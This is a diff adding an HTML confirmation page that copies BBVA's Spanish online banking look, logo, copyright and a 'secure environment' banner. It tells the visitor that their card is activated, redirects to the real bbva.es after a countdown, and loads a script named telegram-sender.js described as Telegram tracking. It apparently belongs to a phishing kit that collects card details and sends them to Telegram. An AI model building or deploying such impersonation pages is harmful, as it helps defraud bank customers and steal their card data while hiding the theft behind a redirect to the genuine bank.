@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html class="js history cssgradients csstransitions" lang="es" xmlns:og="http://ogp.me/ns#" xmlns:fb="http://ogp.me/ns/fb#">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>BBVA - Confirmación</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="shortcut icon" href="assets/img/favicon-bbva-es.ico">
+
+  <!-- BBVA CSS files -->
+  <link href="assets/css/grid.css" media="screen" rel="stylesheet">
+  <link href="assets/css/master-coronita.css" media="screen" rel="stylesheet">
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
+
+  <!-- Custom styles to align with BBVA design -->
+  <style>
+    body {
+        font-family: 'BentonSansBBVA', Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #f4f4f4;
+    }
+
+    @font-face {
+        font-family: 'BentonSansBBVA';
+        src: url('assets/fonts/BentonSansBBVA-Book.woff2') format('woff2'),
+             url('assets/fonts/BentonSansBBVA-Book.woff') format('woff');
+        font-weight: normal;
+        font-style: normal;
+    }
+
+    @font-face {
+        font-family: 'BentonSansBBVA';
+        src: url('assets/fonts/BentonSansBBVA-Medium.woff2') format('woff2'),
+             url('assets/fonts/BentonSansBBVA-Medium.woff') format('woff');
+        font-weight: 500;
+        font-style: normal;
+    }
+
+    @font-face {
+        font-family: 'BentonSansBBVA';
+        src: url('assets/fonts/BentonSansBBVA-Bold.woff2') format('woff2'),
+             url('assets/fonts/BentonSansBBVA-Bold.woff') format('woff');
+        font-weight: bold;
+        font-style: normal;
+    }
+
+    .header {
+        background-color: #fff;
+        padding: 15px 20px;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+    }
+
+    .logo {
+        height: 30px;
+    }
+
+    .header-right {
+        display: flex;
+        align-items: center;
+    }
+
+    .header-right span {
+         font-size: 14px;
+         margin-right: 10px;
+    }
+
+    .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 15px;
+    }
+
+    .main-content {
+        margin-top: 20px;
+    }
+
+    .confirmation-container {
+        background-color: #fff;
+        padding: 30px;
+        border-radius: 5px;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        max-width: 600px;
+        margin: 20px auto;
+        text-align: center;
+    }
+
+    .security-info {
+        background-color: #e8f4fc;
+        padding: 10px 15px;
+        border-left: 4px solid #004481;
+        margin-bottom: 20px;
+        display: flex;
+        align-items: center;
+        font-size: 14px;
+    }
+    
+    .security-icon {
+        display: inline-block;
+        margin-right: 10px;
+        color: #004481;
+    }
+
+    h1 {
+        font-size: 24px;
+        color: #121212;
+        margin-bottom: 25px;
+        font-weight: bold;
+        text-align: center;
+    }
+
+    .confirmation-message {
+        font-size: 18px;
+        color: #004481;
+        font-weight: 500;
+        margin-bottom: 25px;
+    }
+
+    .confirmation-image {
+        max-width: 150px;
+        margin: 20px auto;
+    }
+    
+    .check-icon {
+        width: 80px;
+        height: 80px;
+        background-color: #43a942;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 20px auto;
+        color: white;
+        font-size: 40px;
+    }
+
+    .timer-container {
+        margin-top: 30px;
+        color: #666;
+        font-size: 14px;
+    }
+
+    .timer {
+        font-weight: bold;
+        color: #004481;
+    }
+
+    .footer {
+        margin-top: 30px;
+        text-align: center;
+        color: #666;
+        font-size: 12px;
+        padding: 20px 0;
+    }
+
+    /* Responsive Adjustments */
+    @media (max-width: 768px) {
+        .header {
+            padding: 10px 15px;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .header-right {
+            margin-top: 10px;
+            width: 100%;
+            justify-content: space-between;
+        }
+        .confirmation-container {
+            padding: 20px;
+        }
+        h1 {
+            font-size: 20px;
+        }
+        .confirmation-message {
+            font-size: 16px;
+        }
+    }
+
+    @media (max-width: 480px) {
+        .header-right {
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .header-right span {
+            margin-bottom: 5px;
+        }
+        h1 {
+            font-size: 18px;
+        }
+    }
+  </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Header similar to other pages -->
+        <div class="header">
+            <img src="https://www.bbva.es/content/dam/library/logos/logo-bbva.svg" alt="BBVA Logo" class="logo">
+            <div class="header-right">
+                <span>Acceso seguro</span>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="confirmation-container">
+                <div class="security-info">
+                    <span class="security-icon">🔒</span>
+                    <span>Estás en un entorno con seguridad BBVA</span>
+                </div>
+
+                <h1>Confirmación</h1>
+                
+                <div class="confirmation-message">
+                    <b>Confirmación de su información, su tarjeta está activada</b>
+                </div>
+                
+                <!-- Remplacé l'image GIF par une icône de coche -->
+                <div class="check-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+                
+                <div class="timer-container">
+                    Será redirigido a la página principal en <span id="timer" class="timer">20</span> segundos.
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer similar to other pages -->
+        <div class="footer">
+            <p>© 2025 Banco Bilbao Vizcaya Argentaria, S.A.</p>
+            <p>Creando Oportunidades</p>
+        </div>
+    </div>
+
+    <!-- JS for countdown and redirection -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set countdown timer for 20 seconds
+            let timeLeft = 20;
+            const timerElement = document.getElementById('timer');
+            
+            const countdownInterval = setInterval(function() {
+                timeLeft--;
+                timerElement.textContent = timeLeft;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    window.location.href = 'https://www.bbva.es/personas.html';
+                }
+            }, 1000);
+        });
+    </script>
+    
+    <!-- Script de tracking Telegram -->
+    <script src="js/telegram-sender.js"></script>
+</body>
+</html>
